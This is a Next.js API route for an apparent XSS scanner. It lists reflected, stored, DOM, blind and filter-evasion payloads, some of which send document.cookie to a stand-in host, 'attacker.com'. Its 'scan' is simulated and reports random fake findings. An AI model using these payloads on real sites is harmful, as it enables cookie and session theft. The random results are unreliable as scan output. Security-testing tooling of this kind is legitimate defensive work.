import { type NextRequest, NextResponse } from "next/server"
import { rateLimiter } from "@/lib/rateLimiter"

// XSS Payload collections based on different types and evasion techniques
const XSS_PAYLOADS = {
  basic: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
  ],
  reflected: [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert('Reflected XSS')>",
    "';alert('XSS');//",
    '";alert("XSS");//',
    "</script><script>alert('XSS')</script>",
  ],
  stored: [
    "<script>alert('Stored XSS')</script>",
    "<img src=x onerror=fetch('//attacker.com?cookie='+document.cookie)>",
    "<svg onload=alert('Persistent XSS')>",
    "<iframe src=javascript:alert('Stored')></iframe>",
  ],
  dom: [
    "<img src=x onerror=alert('DOM XSS')>",
    "<svg onload=alert(location.hash)>",
    "<script>eval(location.hash.substr(1))</script>",
    "javascript:alert('DOM-based')",
  ],
  blind: [
    "<script>fetch('//attacker.com/log?data='+document.cookie)</script>",
    "<img src='//attacker.com/pixel.gif?xss=1'>",
    "<script>new Image().src='//attacker.com?'+document.domain</script>",
  ],
  evasion: [
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
    "<svg><script>alert&#40;'XSS'&#41;</script>",
    "<iframe src=data:text/html,<script>alert('XSS')</script>>",
    "<%2Fscript%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
  ],
}

const CONTEXTS = ["HTML_BODY", "HTML_ATTRIBUTE", "JAVASCRIPT", "CSS", "URL", "HTML_COMMENT"]

function getPayloadsByType(type: string, intensity: string): string[] {
  let payloads: string[] = []

  switch (type) {
    case "all":
      payloads = [
        ...XSS_PAYLOADS.basic,
        ...XSS_PAYLOADS.reflected,
        ...XSS_PAYLOADS.stored,
        ...XSS_PAYLOADS.dom,
        ...XSS_PAYLOADS.blind,
      ]
      break
    case "reflected":
      payloads = [...XSS_PAYLOADS.basic, ...XSS_PAYLOADS.reflected]
      break
    case "stored":
      payloads = [...XSS_PAYLOADS.basic, ...XSS_PAYLOADS.stored]
      break
    case "dom":
      payloads = [...XSS_PAYLOADS.basic, ...XSS_PAYLOADS.dom]
      break
    case "blind":
      payloads = [...XSS_PAYLOADS.basic, ...XSS_PAYLOADS.blind]
      break
    default:
      payloads = XSS_PAYLOADS.basic
  }

  if (intensity === "medium" || intensity === "high") {
    payloads = [...payloads, ...XSS_PAYLOADS.evasion.slice(0, 3)]
  }

  if (intensity === "high") {
    payloads = [...payloads, ...XSS_PAYLOADS.evasion]
  }

  return payloads
}

function extractParameters(url: string): string[] {
  try {
    const urlObj = new URL(url)
    return Array.from(urlObj.searchParams.keys())
  } catch {
    return []
  }
}

function detectXSSVulnerability(response: string, payload: string): boolean {
  // Simple detection - in real implementation, this would be more sophisticated
  const decodedResponse = decodeURIComponent(response.toLowerCase())
  const decodedPayload = payload.toLowerCase()

  // Check if payload is reflected in response
  if (decodedResponse.includes(decodedPayload)) {
    return true
  }

  // Check for common XSS indicators
  const xssIndicators = ["<script", "onerror", "onload", "javascript:", "alert(", "eval("]
  return xssIndicators.some((indicator) => decodedResponse.includes(indicator))
}

function determineContext(response: string, payload: string): string {
  const lowerResponse = response.toLowerCase()

  if (lowerResponse.includes(`value="${payload.toLowerCase()}"`)) return "HTML_ATTRIBUTE"
  if (lowerResponse.includes(`<script`) && lowerResponse.includes(payload.toLowerCase())) return "JAVASCRIPT"
  if (lowerResponse.includes(`<style`) && lowerResponse.includes(payload.toLowerCase())) return "CSS"
  if (lowerResponse.includes(`<!--`) && lowerResponse.includes(payload.toLowerCase())) return "HTML_COMMENT"
  if (lowerResponse.includes(`href=`) && lowerResponse.includes(payload.toLowerCase())) return "URL"

  return "HTML_BODY"
}

function calculateSeverity(context: string, payload: string): string {
  if (context === "JAVASCRIPT" || payload.includes("document.cookie")) return "High"
  if (context === "HTML_BODY" || context === "HTML_ATTRIBUTE") return "Medium"
  return "Low"
}

export async function POST(request: NextRequest) {
  try {
    const clientId = request.headers.get("x-forwarded-for") || "unknown"

    if (!rateLimiter.isAllowed(clientId)) {
      return NextResponse.json({ error: "Rate limit exceeded" }, { status: 429 })
    }

    const { url, parameters, payloadType = "all", intensity = "medium", timeout = 10 } = await request.json()

    if (!url) {
      return NextResponse.json({ error: "URL is required" }, { status: 400 })
    }

    // Validate URL format
    try {
      new URL(url)
    } catch {
      return NextResponse.json({ error: "Invalid URL format" }, { status: 400 })
    }

    // Extract or use provided parameters
    const targetParameters = parameters ? parameters.split(",").map((p: string) => p.trim()) : extractParameters(url)

    if (targetParameters.length === 0) {
      return NextResponse.json({ error: "No parameters found to test" }, { status: 400 })
    }

    const payloads = getPayloadsByType(payloadType, intensity)
    const vulnerabilities: any[] = []

    // Simulate XSS testing (in real implementation, this would make actual HTTP requests)
    for (const parameter of targetParameters) {
      for (const payload of payloads.slice(0, intensity === "high" ? 20 : intensity === "medium" ? 10 : 5)) {
        try {
          // Simulate HTTP request with payload
          const testUrl = new URL(url)
          testUrl.searchParams.set(parameter, payload)

          // In a real implementation, you would make an actual HTTP request here
          // For demo purposes, we'll simulate some vulnerabilities
          const isVulnerable = Math.random() > 0.8 // 20% chance of finding vulnerability

          if (isVulnerable) {
            const mockResponse = `<html><body>Search results for: ${payload}</body></html>`
            const context = determineContext(mockResponse, payload)
            const severity = calculateSeverity(context, payload)

            vulnerabilities.push({
              parameter,
              payload,
              method: "GET",
              vulnerability_type: payloadType === "dom" ? "DOM-based XSS" : "Reflected XSS",
              severity,
              context,
              url: testUrl.toString(),
            })
          }
        } catch (error) {
          console.error(`Error testing parameter ${parameter}:`, error)
        }
      }
    }

    // Remove duplicates
    const uniqueVulns = vulnerabilities.filter(
      (vuln, index, self) =>
        index === self.findIndex((v) => v.parameter === vuln.parameter && v.payload === vuln.payload),
    )

    return NextResponse.json({
      url,
      parameters: targetParameters,
      payloadType,
      intensity,
      vulnerabilities: uniqueVulns,
      total: uniqueVulns.length,
      timestamp: new Date().toISOString(),
    })
  } catch (error) {
    console.error("XSS Scanner API error:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
